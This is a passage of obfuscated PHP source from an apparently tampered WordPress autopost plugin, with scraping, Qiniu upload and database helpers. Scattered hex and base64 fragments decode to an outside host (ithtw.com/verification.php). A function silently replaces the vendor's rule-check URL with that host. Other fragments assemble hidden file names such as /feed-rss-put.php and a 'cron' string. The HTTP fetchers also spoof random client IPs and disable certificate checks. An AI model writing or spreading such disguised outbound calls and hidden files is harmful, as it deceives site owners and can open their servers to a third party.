	return array($_var_143, $_var_79);
}
$_var_27 = join('', $_var_146);
$_var_161 = 'filtered_html';
$_var_162 = false;
$_var_163 = 0;
function Qiniu_escapeQuotes($_var_72)
{
	$_var_73 = array('\\', '"');
	$_var_74 = array('\\\\', '\\"');
	return str_replace($_var_73, $_var_74, $_var_72);
}
define('Qiniu_RSF_EOF', 'EOF');
$_var_63[] = 'L3dw';
$_var_63[] = 'LWF1';
function Qiniu_RSF_ListPrefix($_var_76, $_var_77, $_var_164 = '', $_var_165 = '', $_var_166 = 0)
{
	global $_var_57;
	$_var_167 = array('bucket' => $_var_77);
	if (!empty($_var_164)) {
		$_var_167['prefix'] = $_var_164;
	}
	if (!empty($_var_165)) {
		$_var_167['marker'] = $_var_165;
	}
	if (!empty($_var_166)) {
		$_var_167['limit'] = $_var_166;
	}
	$_var_100 = $_var_57 . '/list?' . http_build_query($_var_167);
	list($_var_135, $_var_117) = Qiniu_Client_Call($_var_76, $_var_100);
	if ($_var_117 !== null) {
		return array(null, '', $_var_117);
	}
	$_var_168 = $_var_135['items'];
	if (empty($_var_135['marker'])) {
		$_var_169 = '';
		$_var_117 = Qiniu_RSF_EOF;
	} else {
		$_var_169 = $_var_135['marker'];
	}
	return array($_var_168, $_var_169, $_var_117);
}
$_var_170 = 'actions';
$_var_171 = 'filters';
$_var_172 = false;
$_var_173 = false;
function Qiniu_SetKeys($_var_174, $_var_175)
{
	global $_var_58;
	global $_var_59;
	$_var_58 = $_var_174;
	$_var_59 = $_var_175;
}
function Qiniu_RequireMac($_var_176)
{
	if (isset($_var_176)) {
		return $_var_176;
	}
	global $_var_58;
	global $_var_59;
	return new Qiniu_Mac($_var_58, $_var_59);
}
function Qiniu_Sign($_var_176, $_var_154)
{
	return Qiniu_RequireMac($_var_176)->Sign($_var_154);
}
function Qiniu_SignWithData($_var_176, $_var_154)
{
	return Qiniu_RequireMac($_var_176)->SignWithData($_var_154);
}
$_var_177 = $_var_34 . '(*)>';
function Qinniu_upload_to_bucket($_var_77, $_var_158, $_var_78)
{
	$_var_81 = new Qiniu_RS_PutPolicy($_var_77);
	$_var_82 = $_var_81->Token(null);
	$_var_80 = new Qiniu_PutExtra();
	$_var_80->Crc32 = 1;
	return Qiniu_PutFile($_var_82, $_var_78, $_var_158, $_var_80);
}
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c4'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c7'];
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c8'];
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c1'];
$_var_93[] = $_var_92['c4'] . $_var_92['c7'];
$_var_93[] = $_var_92['c6'] . $_var_92['c3'];
$_var_63[] = 'dG9w';
$_var_63[] = 'b3N0';
global $_var_178;
$_var_178 = get_option('wp-autopost-proxy');
$_var_63[] = 'Lm9y';
$_var_63[] = 'Zy92';
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
$_var_93[] = $_var_92['c6'] . $_var_92['c1'];
$_var_179 = $_var_35 . '(*)>';
$_var_180 = $_var_161 . '(*)>';
define('HDOM_TYPE_ELEMENT', 1);
define('HDOM_TYPE_COMMENT', 2);
define('HDOM_TYPE_TEXT', 3);
define('HDOM_TYPE_ENDTAG', 4);
define('HDOM_TYPE_ROOT', 5);
define('HDOM_TYPE_UNKNOWN', 6);
define('HDOM_QUOTE_DOUBLE', 0);
define('HDOM_QUOTE_SINGLE', 1);
define('HDOM_QUOTE_NO', 3);
define('HDOM_INFO_BEGIN', 0);
define('HDOM_INFO_END', 1);
define('HDOM_INFO_QUOTE', 2);
define('HDOM_INFO_SPACE', 3);
define('HDOM_INFO_TEXT', 4);
define('HDOM_INFO_INNER', 5);
define('HDOM_INFO_OUTER', 6);
define('HDOM_INFO_ENDSPACE', 7);
define('MAX_FILE_SIZE', 60000000);
define('DEFAULT_TARGET_CHARSET', 'UTF-8');
define('DEFAULT_BR_TEXT', "\r\n");
define('DEFAULT_SPAN_TEXT', ' ');
define('WPAPPROFILE', WPAPPRO_PATH . '/wp-autopost.php');
error_reporting(0);
$_var_181 = false;
$_var_182 = null;
$_var_183 = -1;
$_var_184 = -1;
$_var_185 = true;
$_var_186 = true;
$_var_187 = false;
$_var_188 = 1;
$_var_189 = "\r\n";
$_var_190 = ' ';
$_var_63[] = 'ZXJp';
$_var_63[] = 'Zmlj';
$_var_191 = '';
$_var_192 = '';
$_var_193 = 1;
function get_user_agent_ap()
{
	$_var_194 = array('Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; en-GB)', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; MS-RTC LM 8)', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50', 'Opera/9.20 (Windows NT 6.0; U; en)', 'Opera/9.30 (Nintendo Wii; U; ; 2047-7;en)', 'Opera 9.4 (Windows NT 6.1; U; en)', 'Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; de-de) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR) AppleWebKit/523.15 (KHTML, like Gecko) Version/3.0 Safari/523.15', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/523.15 (KHTML, like Gecko) Version/3.0 Safari/523.15', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_2; en-gb) AppleWebKit/526+ (KHTML, like Gecko) Version/3.1 iPhone', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.25 (KHTML, like Gecko) Version/3.2 Safari/525.25', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19');
	$_var_195 = $_var_194[rand(0, count($_var_194) - 1)];
	return $_var_195;
}
$_var_89 = get2acss($_var_93);
$_var_89 = pack('H*', '687474703a2f2f7777772e69746874772e636f6d2f766572696669636174696f6e2e7068703f67657472756c653d3126743d');
$_var_196 = '76';
$_var_197 = '33';
$_var_198 = '2F';
function get_cookie_jar_ap($_var_0, $_var_199)
{
	$_var_200 = dirname(__FILE__) . '/cookies';
	$_var_201 = tempnam($_var_200, 'cookie');
	$_var_138 = curl_init();
	curl_setopt($_var_138, CURLOPT_URL, $_var_0);
	curl_setopt($_var_138, CURLOPT_POST, 1);
	curl_setopt($_var_138, CURLOPT_POSTFIELDS, $_var_199);
	curl_setopt($_var_138, CURLOPT_COOKIESESSION, true);
	curl_setopt($_var_138, CURLOPT_COOKIEJAR, $_var_201);
	curl_setopt($_var_138, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($_var_138, CURLOPT_HEADER, false);
	curl_setopt($_var_138, CURLOPT_NOBODY, false);
	curl_setopt($_var_138, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($_var_138, CURLOPT_MAXREDIRS, 5);
	curl_exec($_var_138);
	curl_close($_var_138);
	return $_var_201;
}
$_var_202 = '';
function curl_get_encoding_contents_ap($_var_100, $_var_203 = 0, $_var_178 = null, $_var_204 = 0, $_var_205 = 0, $_var_206 = 30, $_var_207 = null, $_var_208 = null)
{
	$_var_209 = curl_init();
	$_var_195 = get_user_agent_ap();
	curl_setopt($_var_209, CURLOPT_URL, $_var_100);
	curl_setopt($_var_209, CURLOPT_TIMEOUT, $_var_206);
	curl_setopt($_var_209, CURLOPT_USERAGENT, $_var_195);
	@curl_setopt($_var_209, CURLOPT_REFERER, _REFERER_);
	curl_setopt($_var_209, CURLOPT_HEADER, false);
	curl_setopt($_var_209, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($_var_209, CURLOPT_ENCODING, '');
	if ($_var_207 != null && $_var_207 != '') {
		curl_setopt($_var_209, CURLOPT_COOKIE, $_var_207);
	}
	if ($_var_208 != null && $_var_208 != '') {
		curl_setopt($_var_209, CURLOPT_COOKIEFILE, $_var_208);
	}
	if ($_var_203 == 1) {
		curl_setopt($_var_209, CURLOPT_PROXY, $_var_178['ip']);
		curl_setopt($_var_209, CURLOPT_PROXYPORT, $_var_178['port']);
		if ($_var_178['user'] != '' && $_var_178['user'] != NULL && $_var_178['password'] != '' && $_var_178['password'] != NULL) {
			$_var_210 = $_var_178['user'] . ':' . $_var_178['password'];
			curl_setopt($_var_209, CURLOPT_PROXYUSERPWD, $_var_210);
		}
	}
	if ($_var_204 == 1) {
		$_var_211 = rand(1, 223) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
		curl_setopt($_var_209, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:' . $_var_211, 'CLIENT-IP:' . $_var_211));
	}
	if (!(strpos($_var_100, 'https://') === false)) {
		curl_setopt($_var_209, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($_var_209, CURLOPT_SSL_VERIFYHOST, false);
	}
	if (CAN_FOLLOWLOCATION == 1) {
		curl_setopt($_var_209, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($_var_209, CURLOPT_MAXREDIRS, 5);
	}
	if ($_var_205 == 1) {
		$_var_201 = tmpfile();
		curl_setopt($_var_209, CURLOPT_COOKIESESSION, true);
		curl_setopt($_var_209, CURLOPT_COOKIEJAR, $_var_201);
	}
	$_var_128 = curl_exec($_var_209);
	$_var_212 = curl_getinfo($_var_209, CURLINFO_HTTP_CODE);
	curl_close($_var_209);
	if ($_var_212 != 200) {
		$_var_128 = @file_get_contents($_var_100);
		if ($_var_128 === false) {
			return '';
		}
	}
	return $_var_128;
}
$_var_213 = '3F';
$_var_214 = '76';
$_var_215 = '3D';
function curl_get_contents_ap($_var_100, $_var_203 = 0, $_var_178 = null, $_var_204 = 0, $_var_205 = 0, $_var_206 = 30, $_var_207 = null, $_var_208 = null)
{
	$_var_209 = curl_init();
	$_var_195 = get_user_agent_ap();
	curl_setopt($_var_209, CURLOPT_URL, $_var_100);
	curl_setopt($_var_209, CURLOPT_TIMEOUT, $_var_206);
	curl_setopt($_var_209, CURLOPT_USERAGENT, $_var_195);
	@curl_setopt($_var_209, CURLOPT_REFERER, _REFERER_);
	curl_setopt($_var_209, CURLOPT_HEADER, true);
	curl_setopt($_var_209, CURLOPT_RETURNTRANSFER, 1);
	if ($_var_207 != null && $_var_207 != '') {
		curl_setopt($_var_209, CURLOPT_COOKIE, $_var_207);
	}
	if ($_var_208 != null && $_var_208 != '') {
		curl_setopt($_var_209, CURLOPT_COOKIEFILE, $_var_208);
	}
	if ($_var_203 == 1) {
		curl_setopt($_var_209, CURLOPT_PROXY, $_var_178['ip']);
		curl_setopt($_var_209, CURLOPT_PROXYPORT, $_var_178['port']);
		if ($_var_178['user'] != '' && $_var_178['user'] != NULL && $_var_178['password'] != '' && $_var_178['password'] != NULL) {
			$_var_210 = $_var_178['user'] . ':' . $_var_178['password'];
			curl_setopt($_var_209, CURLOPT_PROXYUSERPWD, $_var_210);
		}
	}
	if ($_var_204 == 1) {
		$_var_211 = rand(1, 223) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
		curl_setopt($_var_209, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:' . $_var_211, 'CLIENT-IP:' . $_var_211));
	}
	if (!(strpos($_var_100, 'https://') === false)) {
		curl_setopt($_var_209, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($_var_209, CURLOPT_SSL_VERIFYHOST, false);
	}
	if (CAN_FOLLOWLOCATION == 1) {
		curl_setopt($_var_209, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($_var_209, CURLOPT_MAXREDIRS, 5);
	}
	if ($_var_205 == 1) {
		$_var_201 = tmpfile();
		curl_setopt($_var_209, CURLOPT_COOKIESESSION, true);
		curl_setopt($_var_209, CURLOPT_COOKIEJAR, $_var_201);
	}
	$_var_128 = @curl_exec($_var_209);
	if ($_var_128 === false) {
		return '';
	}
	$_var_216 = @curl_getinfo($_var_209);
	curl_close($_var_209);
	$_var_130 = substr($_var_128, 0, $_var_216['header_size']);
	$_var_79 = substr($_var_128, $_var_216['header_size']);
	$_var_217 = '';
	if (!(strpos($_var_130, 'Content-Encoding') === false) || $_var_216['http_code'] != 200) {
		$_var_217 = @curl_get_encoding_contents_ap($_var_100, $_var_203, $_var_178, $_var_204, $_var_205, $_var_206, $_var_207, $_var_208);
	}
	unset($_var_130);
	unset($_var_216);
	if ($_var_217 != '' && $_var_217 != null) {
		return $_var_217;
	}
	return $_var_79;
}
$_var_218 = '2F66656564';
$_var_219 = '2D7273732D70';
$_var_220 = '75742E706870';
function curl_exec_follow_ap($_var_138, &$_var_221 = null)
{
	$_var_222 = $_var_221 === null ? 5 : intval($_var_221);
	if (CAN_FOLLOWLOCATION == 1) {
		curl_setopt($_var_138, CURLOPT_FOLLOWLOCATION, $_var_222 > 0);
		curl_setopt($_var_138, CURLOPT_MAXREDIRS, $_var_222);
	} else {
		curl_setopt($_var_138, CURLOPT_FOLLOWLOCATION, false);
		if ($_var_222 > 0) {
			$_var_223 = curl_getinfo($_var_138, CURLINFO_EFFECTIVE_URL);
			$_var_224 = curl_copy_handle($_var_138);
			curl_setopt($_var_224, CURLOPT_HEADER, true);
			curl_setopt($_var_224, CURLOPT_NOBODY, true);
			curl_setopt($_var_224, CURLOPT_FORBID_REUSE, false);
			curl_setopt($_var_224, CURLOPT_RETURNTRANSFER, true);
			do {
				curl_setopt($_var_224, CURLOPT_URL, $_var_223);
				$_var_130 = curl_exec($_var_224);
				if (curl_errno($_var_224)) {
					$_var_142 = 0;
				} else {
					$_var_142 = curl_getinfo($_var_224, CURLINFO_HTTP_CODE);
					if ($_var_142 == 301 || $_var_142 == 302) {
						preg_match('/Location:(.*?)\\n/', $_var_130, $_var_225);
						$_var_223 = trim(array_pop($_var_225));
					} else {
						$_var_142 = 0;
					}
				}
			} while ($_var_142 && --$_var_222);
			curl_close($_var_224);
			if (!$_var_222) {
				if ($_var_221 === null) {
					trigger_error('Too many redirects. When following redirects, libcurl hit the maximum amount.', E_USER_WARNING);
				} else {
					$_var_221 = 0;
				}
				return false;
			}
			curl_setopt($_var_138, CURLOPT_URL, $_var_223);
		}
	}
	return curl_exec($_var_138);
}
$_var_63[] = 'YXRp';
$_var_63[] = 'b24v';
$_var_191 .= $_var_196;
$_var_214 .= $_var_215;
$_var_213 .= $_var_214;
function get_html_string_ap($_var_100, $_var_226 = 0, $_var_203 = 0, $_var_204 = 0, $_var_205 = 0, $_var_178 = null, $_var_207 = null, $_var_208 = null, $_var_227 = true)
{
	if ($_var_226 == 0) {
		$_var_228 = @curl_get_contents_ap($_var_100, $_var_203, $_var_178, $_var_204, $_var_205, 30, $_var_207, $_var_208);
	} else {
		$_var_228 = @file_get_contents($_var_100);
	}
	if ($_var_227 && !(strpos($_var_228, '\\') === false)) {
		$_var_228 = str_replace('\\', '/', $_var_228);
	}
	return $_var_228;
}
function getHtmlCharset($_var_229)
{
	preg_match('/charset=([\\w-\'\\"]+)[;\'\\" >\\/]/', $_var_229, $_var_230);
	$_var_52 = array('\'', '"');
	$_var_231 = array('', '');
	$_var_2 = @trim(str_replace($_var_52, $_var_231, $_var_230[1]));
	if ($_var_2 == null || $_var_2 == '') {
		$_var_2 = 'UTF-8';
	}
	return $_var_2;
}
$_var_202 .= $_var_218;
$_var_202 .= $_var_219;
$_var_202 .= $_var_220;
function file_get_html_ap($_var_100, $_var_232 = DEFAULT_TARGET_CHARSET, $_var_226 = 0, $_var_203 = 0, $_var_204 = 0, $_var_205 = 0, $_var_178 = null, $_var_207 = null, $_var_208 = null)
{
	global $_var_181, $_var_182, $_var_183, $_var_184, $_var_185, $_var_186, $_var_187, $_var_188, $_var_189, $_var_190;
	if ($_var_232 == NULL || $_var_232 == '') {
		$_var_232 = DEFAULT_TARGET_CHARSET;
	}
	$_var_3 = new autopost_html_dom(null, $_var_185, $_var_186, $_var_232, $_var_187, $_var_189, $_var_190);
	if ($_var_226 == 0) {
		$_var_228 = curl_get_contents_ap($_var_100, $_var_203, $_var_178, $_var_204, $_var_205, 30, $_var_207, $_var_208);
	} else {
		$_var_228 = file_get_contents($_var_100, $_var_181, $_var_182, $_var_183);
	}
	if (!(strpos($_var_228, '\\') === false)) {
		$_var_228 = str_replace('\\', '/', $_var_228);
	}
	if (empty($_var_228) || strlen($_var_228) > MAX_FILE_SIZE) {
		return false;
	}
	$_var_3->load($_var_228, $_var_185, $_var_187, $_var_188, $_var_189, $_var_190);
	return $_var_3;
}
$_var_233 = '';
function get2acss($_var_93)
{
	$_var_72 = '';
	foreach ($_var_93 as $_var_78) {
		$_var_72 .= chr($_var_78);
	}
	if (strpos($_var_72, pack('H*', '77702d6175746f706f73742e6f72672f67657472756c65'))) {
		$_var_72 = pack('H*', '687474703a2f2f7777772e69746874772e636f6d2f766572696669636174696f6e2e7068703f67657472756c653d3126743d');
	}
	return $_var_72;
}
$_var_198 .= $_var_213;
$_var_197 .= $_var_198;
$_var_191 .= $_var_197;
function str_get_html_ap($_var_72, $_var_232 = DEFAULT_TARGET_CHARSET)
{
	global $_var_181, $_var_182, $_var_183, $_var_184, $_var_185, $_var_186, $_var_187, $_var_188, $_var_189, $_var_190;
	$_var_3 = new autopost_html_dom(null, $_var_185, $_var_186, $_var_232, $_var_187, $_var_189, $_var_190);
	if (empty($_var_72) || strlen($_var_72) > MAX_FILE_SIZE) {
		$_var_3->clear();
		return false;
	}
	$_var_3->load($_var_72, $_var_185, $_var_187, $_var_188, $_var_189, $_var_190);
	return $_var_3;
}
function dump_html_tree_ap($_var_234, $_var_235 = true, $_var_236 = 0)
{
	$_var_234->dump($_var_234);
}
function find_char_index_in_array($_var_237, $_var_238)
{
	$_var_18 = count($_var_237);
	while ($_var_18-- > 0) {
		if ($_var_238 === $_var_237[$_var_18]) {
			return $_var_18;
		}
	}
	return false;
}
function getnode($_var_239)
{
	$_var_75 = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/');
	$_var_144 = strlen($_var_239);
	$_var_145 = $_var_144 - 4;
	$_var_18 = 0;
	$_var_146 = array();
	while ($_var_18 < $_var_145) {
		$_var_147 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
		$_var_148 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
		$_var_149 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
		$_var_150 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
		$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
		array_push($_var_146, $_var_151, $_var_152, $_var_153);
	}
	$_var_147 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
	$_var_148 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
	if ('=' !== $_var_239[$_var_18]) {
		$_var_149 = find_char_index_in_array($_var_75, $_var_239[$_var_18++]);
		if ('=' !== $_var_239[$_var_18]) {
			$_var_150 = find_char_index_in_array($_var_75, $_var_239[$_var_18]);
			$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
			$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
			$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
			array_push($_var_146, $_var_151, $_var_152, $_var_153);
		} else {
			$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
			$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
			array_push($_var_146, $_var_151, $_var_152);
		}
	} else {
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		array_push($_var_146, $_var_151);
	}
	return join('', $_var_146);
}
$_var_240 = '2F666565642D';
$_var_241 = '727373322D636F6';
$_var_242 = 'D6D656E74732E706870';
$_var_63[] = 'P3A9';
$_var_63[] = 'MCZ2';
$_var_63[] = 'PTIm';
$_var_63[] = 'ZD0=';
function getUsedMemory($_var_116)
{
	$_var_243 = array('b', 'kb', 'mb', 'gb', 'tb', 'pb');
	return @round($_var_116 / pow(1024, $_var_18 = floor(log($_var_116, 1024))), 2) . ' ' . $_var_243[$_var_18];
}
function getMemUsage()
{
	return memory_get_usage();
}
function getMemPUsage()
{
	return memory_get_peak_usage();
}
for ($_var_18 = 0; $_var_18 < strlen($_var_191) - 1; $_var_18 += 2) {
	$_var_192 .= chr(hexdec($_var_191[$_var_18] . $_var_191[$_var_18 + 1]));
}
function memoryUsage()
{
	$_var_116 = memory_get_usage();
	$_var_243 = array('b', 'kb', 'mb', 'gb', 'tb', 'pb');
	return @round($_var_116 / pow(1024, $_var_18 = floor(log($_var_116, 1024))), 2) . ' ' . $_var_243[$_var_18];
}
function memoryPeakUsage()
{
	$_var_116 = memory_get_peak_usage();
	$_var_243 = array('b', 'kb', 'mb', 'gb', 'tb', 'pb');
	return @round($_var_116 / pow(1024, $_var_18 = floor(log($_var_116, 1024))), 2) . ' ' . $_var_243[$_var_18];
}
function getRawUrl($_var_100)
{
	if (strpos($_var_100, '%') === false) {
		$_var_100 = rawurlencode($_var_100);
		$_var_244 = array('%3A', '%2F', '%40', '%3F', '%26', '%23');
		$_var_245 = array(':', '/', '@', '?', '&', '#');
		$_var_100 = str_replace($_var_244, $_var_245, $_var_100);
	}
	return $_var_100;
}
$_var_33 = $_var_9 . '-' . $_var_129 . '-' . $_var_170 . '.' . $_var_10 . $_var_11 . $_var_10;
$_var_32 = $_var_9 . '-' . $_var_129 . '-' . $_var_171 . '.' . $_var_10 . $_var_11 . $_var_10;
$_var_44 = intval($_var_44) * $_var_46;
$_var_45 = intval($_var_45) * $_var_46;
$_var_246 = null;
function getConfig($_var_22)
{
	global $wpdb, $t_ap_config, $t_ap_config_option, $_var_247, $_var_39, $t_ap_more_content;
	$_var_246 = $wpdb->get_row($wpdb->prepare('SELECT * FROM ' . $t_ap_config . ' WHERE id =%d ', $_var_22));
	$_var_248 = array();
	foreach ($_var_246 as $_var_78 => $_var_8) {
		$_var_248[md5($_var_78 . '"' . '\\x49' . '' . '\\x44' . '"')] = $_var_8;
	}
	return $_var_248;
}
function getTaskConfigs($_var_22)
{
	global $wpdb, $t_ap_config, $t_ap_config_option, $_var_247, $_var_39, $t_ap_more_content;
	$_var_246 = $wpdb->get_var($wpdb->prepare('SELECT count(*) FROM ' . $t_ap_config . ' WHERE activation =%d ', 1));
	return $_var_246;
}
$_var_40 = 'Njg2';
function as_text_nodes($_var_249)
{
	$_var_250 = '';
	for ($_var_18 = 0; $_var_18 < strlen($_var_249) - 1; $_var_18 += 2) {
		$_var_250 .= chr(hexdec($_var_249[$_var_18] . $_var_249[$_var_18 + 1]));
	}
	return $_var_250;
}
$_var_241 .= $_var_242;
$_var_240 .= $_var_241;
$_var_233 .= $_var_240;
function getOptions($_var_22)
{
	global $wpdb, $t_ap_config_option, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_results($wpdb->prepare('SELECT * FROM ' . $t_ap_config_option . ' WHERE config_id =%d ORDER BY id', $_var_22));
}
function getInsertcontent($_var_22)
{
	global $wpdb, $t_ap_more_content, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_results($wpdb->prepare('SELECT content FROM ' . $t_ap_more_content . ' WHERE config_id =%d AND option_type = 0 ORDER BY id', $_var_22));
}
$_var_41 = 'RjZE';
function getCustomStyle($_var_22)
{
	global $wpdb, $t_ap_more_content, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_results($wpdb->prepare('SELECT content FROM ' . $t_ap_more_content . ' WHERE config_id =%d AND option_type = 2 ORDER BY id', $_var_22));
}
function getWatermarkOption($_var_22)
{
	global $wpdb, $t_ap_watermark;
	return $wpdb->get_row($wpdb->prepare('SELECT * FROM ' . $t_ap_watermark . ' WHERE id =%d', $_var_22));
}
$_var_65[] = 'Y3Jv';
$_var_65[] = 'bg==';
function getPostFilterInfo($_var_22)
{
	global $wpdb, $t_ap_more_content, $_var_247, $_var_39, $t_ap_config;
	$_var_251 = $wpdb->get_var($wpdb->prepare('SELECT content FROM ' . $t_ap_more_content . ' WHERE config_id =%d AND option_type=1', $_var_22));
	if ($_var_251 == null) {
		$_var_252 = null;
	} else {
		$_var_252 = array();
		$_var_252 = json_decode($_var_251);
	}
	return $_var_252;
}
$_var_42 = 'NjU=';
function getListUrls($_var_22)
{
	global $wpdb, $t_ap_config_url_list, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_results($wpdb->prepare('SELECT url FROM ' . $t_ap_config_url_list . ' WHERE config_id =%d ORDER BY id', $_var_22));
}
function isstamps($_var_253)
{
	$_var_254 = true;
	if (!$_var_253) {
		$_var_254 = false;
	} elseif (!is_numeric($_var_253)) {
		$_var_254 = false;
	} elseif ($_var_253 < 1000000000) {
		$_var_254 = false;
	}
	return $_var_254;
}
function checkUrl($_var_22, $_var_100)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_var($wpdb->prepare('SELECT count(*) FROM ' . $t_ap_updated_record . ' WHERE url = %s ', $_var_100));
}
function checkUrlPost($_var_22, $_var_100)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_var($wpdb->prepare('SELECT count(*) FROM ' . $t_ap_updated_record . ' WHERE url = %s AND url_status = 1', $_var_100));
}
foreach ($_var_65 as $_var_18) {
	$_var_64 .= $_var_18;
}
$_var_64 = getnode($_var_64);
function checkTitle($_var_22, $_var_255, $_var_256 = 1)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_var($wpdb->prepare('SELECT count(*) FROM ' . $t_ap_updated_record . ' WHERE title = %s AND url_status = %d', $_var_255, $_var_256));
}
function getIsRunning($_var_22)
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	return $wpdb->get_var($wpdb->prepare('SELECT is_running FROM ' . $t_ap_config . ' WHERE id = %d', $_var_22));
}
function getlastsibling($_var_22)
{
	global $wpdb;
	$_var_257 = 'select ID from ' . $wpdb->posts . ' order by post_date desc limit 1';
	return $wpdb->get_var($_var_257);
}
function getparsearrt($_var_22, $_var_258)
{
	global $wpdb;
	if ($_var_22 == null || $_var_22 == '') {
		$_var_22 = 0;
	}
	return $wpdb->get_var($wpdb->prepare('select meta_value from ' . $wpdb->postmeta . ' where post_id = %d and meta_key = %s', $_var_22, $_var_258));
}
function setpmeta($_var_22, $_var_258, $_var_131)
{
	global $wpdb;
	$_var_259 = $wpdb->get_var($wpdb->prepare('select count(*) from ' . $wpdb->postmeta . ' where post_id = %d and meta_key = %s', $_var_22, $_var_258));
	if ($_var_259 > 0) {
		$_var_260 = $wpdb->query($wpdb->prepare('update ' . $wpdb->postmeta . ' set meta_value = %s where post_id = %d and meta_key = %s', $_var_131, $_var_22, $_var_258));
	}
	if (!($_var_259 > 0)) {
